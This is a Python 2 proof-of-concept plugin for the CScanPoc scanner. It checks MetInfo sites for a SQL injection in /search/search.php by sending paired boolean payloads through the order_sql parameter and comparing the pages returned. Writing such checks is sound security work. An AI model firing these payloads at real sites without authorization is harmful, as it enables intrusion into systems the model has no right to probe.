# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'MetInfo_0004' # 平台漏洞编号，留空
    name = 'MetInfo sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-18'  # 漏洞公布时间
    desc = '''
        metinfo最新版一处注入
        漏洞文件:/search/search.php
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '678f1170-7871-4aa8-9a79-161581367048'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref http://wooyun.org/bugs/wooyun-2010-0121480
            hh = hackhttp.hackhttp()
            payload1 = '/search/search.php?&searchtype=1&searchword=a283e9d11ea180bc7a360e9f1a833e51&module=5&lang=cn&order_sql=%20||%201=1%20'
            payload2 = '/search/search.php?&searchtype=1&searchword=a283e9d11ea180bc7a360e9f1a833e51&module=5&lang=cn&order_sql=%20||%201=2%20'
            url1 = self.target + payload1
            url2 = self.target + payload2
            test = '<em style=\'font-style:normal;\'>a283e9d11ea180bc7a360e9f1a833e51</em>'
            test4 = '<font color=red>a283e9d11ea180bc7a360e9f1a833e51</font>'
            code, head,res1, errcode, _ = hh.http(url1)
            code, head,res2, errcode, _ = hh.http(url2)

            if code == 200 and test not in res1 and test in res2:
               #security_hole(url1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                return
            if code == 200 and test4 not in res1 and test4 in res2:
                #security_hole(url1) 
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))               

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
